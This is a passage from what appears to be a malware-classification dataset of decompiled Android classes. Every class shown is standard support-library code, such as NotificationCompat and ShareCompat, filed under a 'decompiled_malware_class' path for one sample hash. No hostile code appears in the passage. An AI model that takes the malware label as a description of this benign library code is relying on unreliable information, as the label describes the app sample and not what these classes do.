this;     }     public Builder setSmallIcon(    int icon,    int level){       this.mNotification.icon=icon;       this.mNotification.iconLevel=level;       return this;     }     public Builder setContentTitle(    CharSequence title){       this.mContentTitle=title;       return this;     }     public Builder setContentText(    CharSequence text){       this.mContentText=text;       return this;     }     public Builder setSubText(    CharSequence text){       this.mSubText=text;       return this;     }     public Builder setNumber(    int number){       this.mNumber=number;       return this;     }     public Builder setContentInfo(    CharSequence info){       this.mContentInfo=info;       return this;     }     public Builder setProgress(    int max,    int progress,    boolean indeterminate){       this.mProgressMax=max;       this.mProgress=progress;       this.mProgressIndeterminate=indeterminate;       return this;     }     public Builder setContent(    RemoteViews views){       this.mNotification.contentView=views;       return this;     }     public Builder setContentIntent(    PendingIntent intent){       this.mContentIntent=intent;       return this;     }     public Builder setDeleteIntent(    PendingIntent intent){       this.mNotification.deleteIntent=intent;       return this;     }     public Builder setFullScreenIntent(    PendingIntent intent,    boolean highPriority){       this.mFullScreenIntent=intent;       setFlag(128,highPriority);       return this;     }     public Builder setTicker(    CharSequence tickerText){       this.mNotification.tickerText=tickerText;       return this;     }     public Builder setTicker(    CharSequence tickerText,    RemoteViews views){       this.mNotification.tickerText=tickerText;       this.mTickerView=views;       return this;     }     public Builder setLargeIcon(    Bitmap icon){       this.mLargeIcon=icon;       return this;     }     public Builder setSound(    Uri sound){       this.mNotification.sound=sound;       this.mNotification.audioStreamType=-1;       return this;     }     public Builder setSound(    Uri sound,    int streamType){       this.mNotification.sound=sound;       this.mNotification.audioStreamType=streamType;       return this;     }     public Builder setVibrate(    long[] pattern){       this.mNotification.vibrate=pattern;       return this;     }     public Builder setLights(    int argb,    int onMs,    int offMs){       this.mNotification.ledARGB=argb;       this.mNotification.ledOnMS=onMs;       this.mNotification.ledOffMS=offMs;       boolean showLights=(this.mNotification.ledOnMS == 0 || this.mNotification.ledOffMS == 0) ? false : true;       this.mNotification.flags=(showLights ? 1 : 0) | (this.mNotification.flags & (-2));       return this;     }     public Builder setOngoing(    boolean ongoing){       setFlag(2,ongoing);       return this;     }     public Builder setOnlyAlertOnce(    boolean onlyAlertOnce){       setFlag(8,onlyAlertOnce);       return this;     }     public Builder setAutoCancel(    boolean autoCancel){       setFlag(16,autoCancel);       return this;     }     public Builder setDefaults(    int defaults){       this.mNotification.defaults=defaults;       if ((defaults & 4) != 0) {         this.mNotification.flags|=1;       }       return this;     }     private void setFlag(    int mask,    boolean value){       if (value) {         this.mNotification.flags|=mask;       }  else {         this.mNotification.flags&=mask ^ (-1);       }     }     public Builder setPriority(    int pri){       this.mPriority=pri;       return this;     }     public Builder addAction(    int icon,    CharSequence title,    PendingIntent intent){       this.mActions.add(new Action(icon,title,intent));       return this;     }     public Builder setStyle(    Style style){       if (this.mStyle != style) {         this.mStyle=style;         if (this.mStyle != null) {           this.mStyle.setBuilder(this);         }       }       return this;     }     @Deprecated public Notification getNotification(){       return NotificationCompat.IMPL.build(this);     }     public Notification build(){       return NotificationCompat.IMPL.build(this);     }   } public static abstract class Style {     CharSequence mBigContentTitle;     Builder mBuilder;     CharSequence mSummaryText;     boolean mSummaryTextSet=false;     public void setBuilder(    Builder builder){       if (this.mBuilder != builder) {         this.mBuilder=builder;         if (this.mBuilder != null) {           this.mBuilder.setStyle(this);         }       }     }     public Notification build(){       if (this.mBuilder == null) {         return null;       }       Notification notification=this.mBuilder.build();       return notification;     }   } public static class BigPictureStyle extends Style {     Bitmap mBigLargeIcon;     boolean mBigLargeIconSet;     Bitmap mPicture;     public BigPictureStyle(){     }     public BigPictureStyle(    Builder builder){       setBuilder(builder);     }     public BigPictureStyle setBigContentTitle(    CharSequence title){       this.mBigContentTitle=title;       return this;     }     public BigPictureStyle setSummaryText(    CharSequence cs){       this.mSummaryText=cs;       this.mSummaryTextSet=true;       return this;     }     public BigPictureStyle bigPicture(    Bitmap b){       this.mPicture=b;       return this;     }     public BigPictureStyle bigLargeIcon(    Bitmap b){       this.mBigLargeIcon=b;       this.mBigLargeIconSet=true;       return this;     }   } public static class BigTextStyle extends Style {     CharSequence mBigText;     public BigTextStyle(){     }     public BigTextStyle(    Builder builder){       setBuilder(builder);     }     public BigTextStyle setBigContentTitle(    CharSequence title){       this.mBigContentTitle=title;       return this;     }     public BigTextStyle setSummaryText(    CharSequence cs){       this.mSummaryText=cs;       this.mSummaryTextSet=true;       return this;     }     public BigTextStyle bigText(    CharSequence cs){       this.mBigText=cs;       return this;     }   } public static class InboxStyle extends Style {     ArrayList<CharSequence> mTexts=new ArrayList<>();     public InboxStyle(){     }     public InboxStyle(    Builder builder){       setBuilder(builder);     }     public InboxStyle setBigContentTitle(    CharSequence title){       this.mBigContentTitle=title;       return this;     }     public InboxStyle setSummaryText(    CharSequence cs){       this.mSummaryText=cs;       this.mSummaryTextSet=true;       return this;     }     public InboxStyle addLine(    CharSequence cs){       this.mTexts.add(cs);       return this;     }   } public static class Action {     public PendingIntent actionIntent;     public int icon;     public CharSequence title;     public Action(    int icon_,    CharSequence title_,    PendingIntent intent_){       this.icon=icon_;       this.title=title_;       this.actionIntent=intent_;     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\NotificationCompatHoneycomb.code","class NotificationCompatHoneycomb {   NotificationCompatHoneycomb(){   }   public static Notification add(  Context context,  Notification n,  CharSequence contentTitle,  CharSequence contentText,  CharSequence contentInfo,  RemoteViews tickerView,  int number,  PendingIntent contentIntent,  PendingIntent fullScreenIntent,  Bitmap largeIcon){     Notification.Builder b=new Notification.Builder(context).setWhen(n.when).setSmallIcon(n.icon,n.iconLevel).setContent(n.contentView).setTicker(n.tickerText,tickerView).setSound(n.sound,n.audioStreamType).setVibrate(n.vibrate).setLights(n.ledARGB,n.ledOnMS,n.ledOffMS).setOngoing((n.flags & 2) != 0).setOnlyAlertOnce((n.flags & 8) != 0).setAutoCancel((n.flags & 16) != 0).setDefaults(n.defaults).setContentTitle(contentTitle).setContentText(contentText).setContentInfo(contentInfo).setContentIntent(contentIntent).setDeleteIntent(n.deleteIntent).setFullScreenIntent(fullScreenIntent,(n.flags & 128) != 0).setLargeIcon(largeIcon).setNumber(number);     return b.getNotification();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\NotificationCompatIceCreamSandwich.code","class NotificationCompatIceCreamSandwich {   NotificationCompatIceCreamSandwich(){   }   public static Notification add(  Context context,  Notification n,  CharSequence contentTitle,  CharSequence contentText,  CharSequence contentInfo,  RemoteViews tickerView,  int number,  PendingIntent contentIntent,  PendingIntent fullScreenIntent,  Bitmap largeIcon,  int mProgressMax,  int mProgress,  boolean mProgressIndeterminate){     Notification.Builder b=new Notification.Builder(context).setWhen(n.when).setSmallIcon(n.icon,n.iconLevel).setContent(n.contentView).setTicker(n.tickerText,tickerView).setSound(n.sound,n.audioStreamType).setVibrate(n.vibrate).setLights(n.ledARGB,n.ledOnMS,n.ledOffMS).setOngoing((n.flags & 2) != 0).setOnlyAlertOnce((n.flags & 8) != 0).setAutoCancel((n.flags & 16) != 0).setDefaults(n.defaults).setContentTitle(contentTitle).setContentText(contentText).setContentInfo(contentInfo).setContentIntent(contentIntent).setDeleteIntent(n.deleteIntent).setFullScreenIntent(fullScreenIntent,(n.flags & 128) != 0).setLargeIcon(largeIcon).setNumber(number).setProgress(mProgressMax,mProgress,mProgressIndeterminate);     return b.getNotification();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\NotificationCompatImpl.code","public interface NotificationCompatImpl {   Notification build(  Builder builder); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\NotificationCompatImplBase.code","static class NotificationCompatImplBase implements NotificationCompatImpl {   NotificationCompatImplBase(){   }   @Override public Notification build(  Builder b){     Notification result=b.mNotification;     result.setLatestEventInfo(b.mContext,b.mContentTitle,b.mContentText,b.mContentIntent);     if (b.mPriority > 0) {       result.flags|=128;     }     return result;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\NotificationCompatImplHoneycomb.code","static class NotificationCompatImplHoneycomb implements NotificationCompatImpl {   NotificationCompatImplHoneycomb(){   }   @Override public Notification build(  Builder b){     return NotificationCompatHoneycomb.add(b.mContext,b.mNotification,b.mContentTitle,b.mContentText,b.mContentInfo,b.mTickerView,b.mNumber,b.mContentIntent,b.mFullScreenIntent,b.mLargeIcon);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\NotificationCompatImplIceCreamSandwich.code","static class NotificationCompatImplIceCreamSandwich implements NotificationCompatImpl {   NotificationCompatImplIceCreamSandwich(){   }   @Override public Notification build(  Builder b){     return NotificationCompatIceCreamSandwich.add(b.mContext,b.mNotification,b.mContentTitle,b.mContentText,b.mContentInfo,b.mTickerView,b.mNumber,b.mContentIntent,b.mFullScreenIntent,b.mLargeIcon,b.mProgressMax,b.mProgress,b.mProgressIndeterminate);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\NotificationCompatImplJellybean.code","static class NotificationCompatImplJellybean implements NotificationCompatImpl {   NotificationCompatImplJellybean(){   }   @Override public Notification build(  Builder b){     NotificationCompatJellybean jbBuilder=new NotificationCompatJellybean(b.mContext,b.mNotification,b.mContentTitle,b.mContentText,b.mContentInfo,b.mTickerView,b.mNumber,b.mContentIntent,b.mFullScreenIntent,b.mLargeIcon,b.mProgressMax,b.mProgress,b.mProgressIndeterminate,b.mUseChronometer,b.mPriority,b.mSubText);     Iterator i$=b.mActions.iterator();     while (i$.hasNext()) {       Action action=i$.next();       jbBuilder.addAction(action.icon,action.title,action.actionIntent);     }     if (b.mStyle != null) {       if (b.mStyle instanceof BigTextStyle) {         BigTextStyle style=(BigTextStyle)b.mStyle;         jbBuilder.addBigTextStyle(style.mBigContentTitle,style.mSummaryTextSet,style.mSummaryText,style.mBigText);       }  else       if (b.mStyle instanceof InboxStyle) {         InboxStyle style2=(InboxStyle)b.mStyle;         jbBuilder.addInboxStyle(style2.mBigContentTitle,style2.mSummaryTextSet,style2.mSummaryText,style2.mTexts);       }  else       if (b.mStyle instanceof BigPictureStyle) {         BigPictureStyle style3=(BigPictureStyle)b.mStyle;         jbBuilder.addBigPictureStyle(style3.mBigContentTitle,style3.mSummaryTextSet,style3.mSummaryText,style3.mPicture,style3.mBigLargeIcon,style3.mBigLargeIconSet);       }     }     return jbBuilder.build();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\NotificationCompatJellybean.code","class NotificationCompatJellybean {   private Notification.Builder b;   public NotificationCompatJellybean(  Context context,  Notification n,  CharSequence contentTitle,  CharSequence contentText,  CharSequence contentInfo,  RemoteViews tickerView,  int number,  PendingIntent contentIntent,  PendingIntent fullScreenIntent,  Bitmap largeIcon,  int mProgressMax,  int mProgress,  boolean mProgressIndeterminate,  boolean useChronometer,  int priority,  CharSequence subText){     this.b=new Notification.Builder(context).setWhen(n.when).setSmallIcon(n.icon,n.iconLevel).setContent(n.contentView).setTicker(n.tickerText,tickerView).setSound(n.sound,n.audioStreamType).setVibrate(n.vibrate).setLights(n.ledARGB,n.ledOnMS,n.ledOffMS).setOngoing((n.flags & 2) != 0).setOnlyAlertOnce((n.flags & 8) != 0).setAutoCancel((n.flags & 16) != 0).setDefaults(n.defaults).setContentTitle(contentTitle).setContentText(contentText).setSubText(subText).setContentInfo(contentInfo).setContentIntent(contentIntent).setDeleteIntent(n.deleteIntent).setFullScreenIntent(fullScreenIntent,(n.flags & 128) != 0).setLargeIcon(largeIcon).setNumber(number).setUsesChronometer(useChronometer).setPriority(priority).setProgress(mProgressMax,mProgress,mProgressIndeterminate);   }   public void addAction(  int icon,  CharSequence title,  PendingIntent intent){     this.b.addAction(icon,title,intent);   }   public void addBigTextStyle(  CharSequence bigContentTitle,  boolean useSummary,  CharSequence summaryText,  CharSequence bigText){     Notification.BigTextStyle style=new Notification.BigTextStyle(this.b).setBigContentTitle(bigContentTitle).bigText(bigText);     if (useSummary) {       style.setSummaryText(summaryText);     }   }   public void addBigPictureStyle(  CharSequence bigContentTitle,  boolean useSummary,  CharSequence summaryText,  Bitmap bigPicture,  Bitmap bigLargeIcon,  boolean bigLargeIconSet){     Notification.BigPictureStyle style=new Notification.BigPictureStyle(this.b).setBigContentTitle(bigContentTitle).bigPicture(bigPicture);     if (bigLargeIconSet) {       style.bigLargeIcon(bigLargeIcon);     }     if (useSummary) {       style.setSummaryText(summaryText);     }   }   public void addInboxStyle(  CharSequence bigContentTitle,  boolean useSummary,  CharSequence summaryText,  ArrayList<CharSequence> texts){     Notification.InboxStyle style=new Notification.InboxStyle(this.b).setBigContentTitle(bigContentTitle);     if (useSummary) {       style.setSummaryText(summaryText);     }     Iterator i$=texts.iterator();     while (i$.hasNext()) {       CharSequence text=i$.next();       style.addLine(text);     }   }   public Notification build(){     return this.b.build();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\OnBackStackChangedListener.code","public interface OnBackStackChangedListener {   void onBackStackChanged(); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\Op.code","public static final class Op {   int cmd;   int enterAnim;   int exitAnim;   Fragment fragment;   Op next;   int popEnterAnim;   int popExitAnim;   Op prev;   ArrayList<Fragment> removed; } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\SavedState.code","public static class SavedState implements Parcelable {   public static final Parcelable.Creator<SavedState> CREATOR=new Parcelable.Creator<SavedState>(){     @Override public SavedState createFromParcel(    Parcel in){       return new SavedState(in,null);     }     @Override public SavedState[] newArray(    int size){       return new SavedState[size];     }   } ;   final Bundle mState;   public SavedState(  Bundle state){     this.mState=state;   }   SavedState(  Parcel in,  ClassLoader loader){     this.mState=in.readBundle();     if (loader != null && this.mState != null) {       this.mState.setClassLoader(loader);     }   }   @Override public int describeContents(){     return 0;   }   @Override public void writeToParcel(  Parcel dest,  int flags){     dest.writeBundle(this.mState);   } } public static class SavedState extends View.BaseSavedState {   public static final Parcelable.Creator<SavedState> CREATOR=new Parcelable.Creator<SavedState>(){     @Override public SavedState createFromParcel(    Parcel in){       return new SavedState(in);     }     @Override public SavedState[] newArray(    int size){       return new SavedState[size];     }   } ;   String curTab;   SavedState(  Parcelable superState){     super(superState);   }   private SavedState(  Parcel in){     super(in);     this.curTab=in.readString();   }   @Override public void writeToParcel(  Parcel out,  int flags){     super.writeToParcel(out,flags);     out.writeString(this.curTab);   }   public String toString(){     return ""FragmentTabHost.SavedState{"" + Integer.toHexString(System.identityHashCode(this)) + "" curTab=""+ this.curTab+ ""}"";   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\ServiceCompat.code","public class ServiceCompat {   public static final int START_STICKY=1;   private ServiceCompat(){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\SetIndicatorInfo.code","private static class SetIndicatorInfo {   public Method setHomeActionContentDescription;   public Method setHomeAsUpIndicator;   public ImageView upIndicatorView;   SetIndicatorInfo(  Activity activity){     try {       this.setHomeAsUpIndicator=ActionBar.class.getDeclaredMethod(""setHomeAsUpIndicator"",Drawable.class);       this.setHomeActionContentDescription=ActionBar.class.getDeclaredMethod(""setHomeActionContentDescription"",Integer.TYPE);     }  catch (    NoSuchMethodException e) {       View home=activity.findViewById(R.id.home);       if (home != null) {         ViewGroup parent=(ViewGroup)home.getParent();         int childCount=parent.getChildCount();         if (childCount == 2) {           View first=parent.getChildAt(0);           View second=parent.getChildAt(1);           View up=first.getId() == 16908332 ? second : first;           if (up instanceof ImageView) {             this.upIndicatorView=(ImageView)up;           }         }       }     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\ShareCompat.code","public class ShareCompat {   public static final String EXTRA_CALLING_ACTIVITY=""android.support.v4.app.EXTRA_CALLING_ACTIVITY"";   public static final String EXTRA_CALLING_PACKAGE=""android.support.v4.app.EXTRA_CALLING_PACKAGE"";   private static ShareCompatImpl IMPL; public interface ShareCompatImpl {     void configureMenuItem(    MenuItem menuItem,    IntentBuilder intentBuilder);     String escapeHtml(    CharSequence charSequence);   } static class ShareCompatImplBase implements ShareCompatImpl {     ShareCompatImplBase(){     }     @Override public void configureMenuItem(    MenuItem item,    IntentBuilder shareIntent){       item.setIntent(shareIntent.createChooserIntent());     }     @Override public String escapeHtml(    CharSequence text){       StringBuilder out=new StringBuilder();       withinStyle(out,text,0,text.length());       return out.toString();     }     private static void withinStyle(    StringBuilder out,    CharSequence text,    int start,    int end){       int i=start;       while (i < end) {         char c=text.charAt(i);         if (c == '<') {           out.append(""&lt;"");         }  else         if (c == '>') {           out.append(""&gt;"");         }  else         if (c == '&') {           out.append(""&amp;"");         }  else         if (c > '~' || c < ' ') {           out.append(""&#"" + ((int)c) + "";"");         }  else         if (c == ' ') {           while (i + 1 < end && text.charAt(i + 1) == ' ') {             out.append(""&nbsp;"");             i++;           }           out.append(' ');         }  else {           out.append(c);         }         i++;       }     }   } static class ShareCompatImplICS extends ShareCompatImplBase {     ShareCompatImplICS(){     }     @Override public void configureMenuItem(    MenuItem item,    IntentBuilder shareIntent){       ShareCompatICS.configureMenuItem(item,shareIntent.getActivity(),shareIntent.getIntent());       if (shouldAddChooserIntent(item)) {         item.setIntent(shareIntent.createChooserIntent());       }     }     boolean shouldAddChooserIntent(    MenuItem item){       return !item.hasSubMenu();     }   } static class ShareCompatImplJB extends ShareCompatImplICS {     ShareCompatImplJB(){     }     @Override public String escapeHtml(    CharSequence html){       return ShareCompatJB.escapeHtml(html);     }     @Override boolean shouldAddChooserIntent(    MenuItem item){       return false;     }   } static {     if (Build.VERSION.SDK_INT >= 16) {       IMPL=new ShareCompatImplJB();     }  else     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new ShareCompatImplICS();     }  else {       IMPL=new ShareCompatImplBase();     }   }   public static String getCallingPackage(  Activity calledActivity){     String result=calledActivity.getCallingPackage();     if (result == null) {       return calledActivity.getIntent().getStringExtra(EXTRA_CALLING_PACKAGE);     }     return result;   }   public static ComponentName getCallingActivity(  Activity calledActivity){     ComponentName result=calledActivity.getCallingActivity();     if (result == null) {       return (ComponentName)calledActivity.getIntent().getParcelableExtra(EXTRA_CALLING_ACTIVITY);     }     return result;   }   public static void configureMenuItem(  MenuItem item,  IntentBuilder shareIntent){     IMPL.configureMenuItem(item,shareIntent);   }   public static void configureMenuItem(  Menu menu,  int menuItemId,  IntentBuilder shareIntent){     MenuItem item=menu.findItem(menuItemId);     if (item == null) {       throw new IllegalArgumentException(""Could not find menu item with id "" + menuItemId + "" in the supplied menu"");     }     configureMenuItem(item,shareIntent);   } public static class IntentBuilder {     private Activity mActivity;     private ArrayList<String> mBccAddresses;     private ArrayList<String> mCcAddresses;     private CharSequence mChooserTitle;     private Intent mIntent=new Intent().setAction(""android.intent.action.SEND"");     private ArrayList<Uri> mStreams;     private ArrayList<String> mToAddresses;     public static IntentBuilder from(    Activity launchingActivity){       return new IntentBuilder(launchingActivity);     }     private IntentBuilder(    Activity launchingActivity){       this.mActivity=launchingActivity;       this.mIntent.putExtra(ShareCompat.EXTRA_CALLING_PACKAGE,launchingActivity.getPackageName());       this.mIntent.putExtra(ShareCompat.EXTRA_CALLING_ACTIVITY,launchingActivity.getComponentName());       this.mIntent.addFlags(AccessibilityEventCompat.TYPE_GESTURE_DETECTION_END);     }     public Intent getIntent(){       if (this.mToAddresses != null) {         combineArrayExtra(""android.intent.extra.EMAIL"",this.mToAddresses);         this.mToAddresses=null;       }       if (this.mCcAddresses != null) {         combineArrayExtra(""android.intent.extra.CC"",this.mCcAddresses);         this.mCcAddresses=null;       }       if (this.mBccAddresses != null) {         combineArrayExtra(""android.intent.extra.BCC"",this.mBccAddresses);         this.mBccAddresses=null;       }       boolean needsSendMultiple=this.mStreams != null && this.mStreams.size() > 1;       boolean isSendMultiple=this.mIntent.getAction().equals(""android.intent.action.SEND_MULTIPLE"");       if (!needsSendMultiple && isSendMultiple) {         this.mIntent.setAction(""android.intent.action.SEND"");         if (this.mStreams != null && !this.mStreams.isEmpty()) {           this.mIntent.putExtra(""android.intent.extra.STREAM"",this.mStreams.get(0));         }  else {           this.mIntent.removeExtra(""android.intent.extra.STREAM"");         }         this.mStreams=null;       }       if (needsSendMultiple && !isSendMultiple) {         this.mIntent.setAction(""android.intent.action.SEND_MULTIPLE"");         if (this.mStreams != null && !this.mStreams.isEmpty()) {           this.mIntent.putParcelableArrayListExtra(""android.intent.extra.STREAM"",this.mStreams);         }  else {           this.mIntent.removeExtra(""android.intent.extra.STREAM"");         }       }       return this.mIntent;     }     Activity getActivity(){       return this.mActivity;     }     private void combineArrayExtra(    String extra,    ArrayList<String> add){       String[] currentAddresses=this.mIntent.getStringArrayExtra(extra);       int currentLength=currentAddresses != null ? currentAddresses.length : 0;       String[] finalAddresses=new String[add.size() + currentLength];       add.toArray(finalAddresses);       if (currentAddresses != null) {         System.arraycopy(currentAddresses,0,finalAddresses,add.size(),currentLength);       }       this.mIntent.putExtra(extra,finalAddresses);     }     private void combineArrayExtra(    String extra,    String[] add){       Intent intent=getIntent();       String[] old=intent.getStringArrayExtra(extra);       int oldLength=old != null ? old.length : 0;       String[] result=new String[add.length + oldLength];       if (old != null) {         System.arraycopy(old,0,result,0,oldLength);       }       System.arraycopy(add,0,result,oldLength,add.length);       intent.putExtra(extra,result);     }     public Intent createChooserIntent(){       return Intent.createChooser(getIntent(),this.mChooserTitle);     }     public void startChooser(){       this.mActivity.startActivity(createChooserIntent());     }     public IntentBuilder setChooserTitle(    CharSequence title){       this.mChooserTitle=title;       return this;     }     public IntentBuilder setChooserTitle(    int resId){       return setChooserTitle(this.mActivity.getText(resId));     }     public IntentBuilder setType(    String mimeType){       this.mIntent.setType(mimeType);       return this;     }     public IntentBuilder setText(    CharSequence text){       this.mIntent.putExtra(""android.intent.extra.TEXT"",text);       return this;     }     public IntentBuilder setHtmlText(    String htmlText){       this.mIntent.putExtra(IntentCompat.EXTRA_HTML_TEXT,htmlText);       if (!this.mIntent.hasExtra(""android.intent.extra.TEXT"")) {         setText(Html.fromHtml(htmlText));       }       return this;     }     public IntentBuilder setStream(    Uri streamUri){       if (!this.mIntent.getAction().equals(""android.intent.action.SEND"")) {         this.mIntent.setAction(""android.intent.action.SEND"");       }       this.mStreams=null;       this.mIntent.putExtra(""android.intent.extra.STREAM"",streamUri);       return this;     }     public IntentBuilder addStream(    Uri streamUri){       Uri currentStream=(Uri)this.mIntent.getParcelableExtra(""android.intent.extra.STREAM"");       if (currentStream == null) {         return setStream(streamUri);       }       if (this.mStreams == null) {         this.mStreams=new ArrayList<>();       }       if (currentStream != null) {         this.mIntent.removeExtra(""android.intent.extra.STREAM"");         this.mStreams.add(currentStream);       }       this.mStreams.add(streamUri);       return this;     }     public IntentBuilder setEmailTo(    String[] addresses){       if (this.mToAddresses != null) {         this.mToAddresses=null;       }       this.mIntent.putExtra(""android.intent.extra.EMAIL"",addresses);       return this;     }     public IntentBuilder addEmailTo(    String address){       if (this.mToAddresses == null) {         this.mToAddresses=new ArrayList<>();       }       this.mToAddresses.add(address);       return this;     }     public IntentBuilder addEmailTo(    String[] addresses){       combineArrayExtra(""android.intent.extra.EMAIL"",addresses);       return this;     }     public IntentBuilder setEmailCc(    String[] addresses){       this.mIntent.putExtra(""android.intent.extra.CC"",addresses);       return this;     }     public IntentBuilder addEmailCc(    String address){       if (this.mCcAddresses == null) {         this.mCcAddresses=new ArrayList<>();       }       this.mCcAddresses.add(address);       return this;     }     public IntentBuilder addEmailCc(    String[] addresses){       combineArrayExtra(""android.intent.extra.CC"",addresses);       return this;     }     public IntentBuilder setEmailBcc(    String[] addresses){       this.mIntent.putExtra(""android.intent.extra.BCC"",addresses);       return this;     }     public IntentBuilder addEmailBcc(    String address){       if (this.mBccAddresses == null) {         this.mBccAddresses=new ArrayList<>();       }       this.mBccAddresses.add(address);       return this;     }     public IntentBuilder addEmailBcc(    String[] addresses){       combineArrayExtra(""android.intent.extra.BCC"",addresses);       return this;     }     public IntentBuilder setSubject(    String subject){       this.mIntent.putExtra(""android.intent.extra.SUBJECT"",subject);       return this;     }   } public static class IntentReader {     private static final String TAG=""IntentReader"";     private Activity mActivity;     private ComponentName mCallingActivity;     private String mCallingPackage;     private Intent mIntent;     private ArrayList<Uri> mStreams;     public static IntentReader from(    Activity activity){       return new IntentReader(activity);     }     private IntentReader(    Activity activity){       this.mActivity=activity;       this.mIntent=activity.getIntent();       this.mCallingPackage=ShareCompat.getCallingPackage(activity);       this.mCallingActivity=ShareCompat.getCallingActivity(activity);     }     public boolean isShareIntent(){       String action=this.mIntent.getAction();       return ""android.intent.action.SEND"".equals(action) || ""android.intent.action.SEND_MULTIPLE"".equals(action);     }     public boolean isSingleShare(){       return ""android.intent.action.SEND"".equals(this.mIntent.getAction());     }     public boolean isMultipleShare(){       return ""android.intent.action.SEND_MULTIPLE"".equals(this.mIntent.getAction());     }     public String getType(){       return this.mIntent.getType();     }     public CharSequence getText(){       return this.mIntent.getCharSequenceExtra(""android.intent.extra.TEXT"");     }     public String getHtmlText(){       String result=this.mIntent.getStringExtra(IntentCompat.EXTRA_HTML_TEXT);       if (result == null) {         CharSequence text=getText();         if (text instanceof Spanned) {           return Html.toHtml((Spanned)text);         }         if (text != null) {           return ShareCompat.IMPL.escapeHtml(text);         }         return result;       }       return result;     }     public Uri getStream(){       return (Uri)this.mIntent.getParcelableExtra(""android.intent.extra.STREAM"");     }     public Uri getStream(    int index){       if (this.mStreams == null && isMultipleShare()) {         this.mStreams=this.mIntent.getParcelableArrayListExtra(""android.intent.extra.STREAM"");       }       if (this.mStreams != null) {         return this.mStreams.get(index);       }       if (index == 0) {         return (Uri)this.mIntent.getParcelableExtra(""android.intent.extra.STREAM"");       }       throw new IndexOutOfBoundsException(""Stream items available: "" + getStreamCount() + "" index requested: ""+ index);     }     public int getStreamCount(){       if (this.mStreams == null && isMultipleShare()) {         this.mStreams=this.mIntent.getParcelableArrayListExtra(""android.intent.extra.STREAM"");       }       if (this.mStreams != null) {         return this.mStreams.size();       }       return this.mIntent.hasExtra(""android.intent.extra.STREAM"") ? 1 : 0;     }     public String[] getEmailTo(){       return this.mIntent.getStringArrayExtra(""android.intent.extra.EMAIL"");     }     public String[] getEmailCc(){       return this.mIntent.getStringArrayExtra(""android.intent.extra.CC"");     }     public String[] getEmailBcc(){       return this.mIntent.getStringArrayExtra(""android.intent.extra.BCC"");     }     public String getSubject(){       return this.mIntent.getStringExtra(""android.intent.extra.SUBJECT"");     }     public String getCallingPackage(){       return this.mCallingPackage;     }     public ComponentName getCallingActivity(){       return this.mCallingActivity;     }     public Drawable getCallingActivityIcon(){       if (this.mCallingActivity == null) {         return null;       }       PackageManager pm=this.mActivity.getPackageManager();       try {         return pm.getActivityIcon(this.mCallingActivity);       }  catch (      PackageManager.NameNotFoundException e) {         Log.e(TAG,""Could not retrieve icon for calling activity"",e);         return null;       }     }     public Drawable getCallingApplicationIcon(){       if (this.mCallingPackage == null) {         return null;       }       PackageManager pm=this.mActivity.getPackageManager();       try {         return pm.getApplicationIcon(this.mCallingPackage);       }  catch (      PackageManager.NameNotFoundException e) {         Log.e(TAG,""Could not retrieve icon for calling application"",e);         return null;       }     }     public CharSequence getCallingApplicationLabel(){       if (this.mCallingPackage == null) {         return null;       }       PackageManager pm=this.mActivity.getPackageManager();       try {         return pm.getApplicationLabel(pm.getApplicationInfo(this.mCallingPackage,0));       }  catch (      PackageManager.NameNotFoundException e) {         Log.e(TAG,""Could not retrieve label for calling application"",e);         return null;       }     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\ShareCompatICS.code","class ShareCompatICS {   private static final String HISTORY_FILENAME_PREFIX="".sharecompat_"";   ShareCompatICS(){   }   public static void configureMenuItem(  MenuItem item,  Activity callingActivity,  Intent intent){     ShareActionProvider provider;     ActionProvider itemProvider=item.getActionProvider();     if (!(itemProvider instanceof ShareActionProvider)) {       provider=new ShareActionProvider(callingActivity);     }  else {       provider=(ShareActionProvider)itemProvider;     }     provider.setShareHistoryFileName(HISTORY_FILENAME_PREFIX + callingActivity.getClass().getName());     provider.setShareIntent(intent);     item.setActionProvider(provider);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\ShareCompatImpl.code","public interface ShareCompatImpl {   void configureMenuItem(  MenuItem menuItem,  IntentBuilder intentBuilder);   String escapeHtml(  CharSequence charSequence); } "
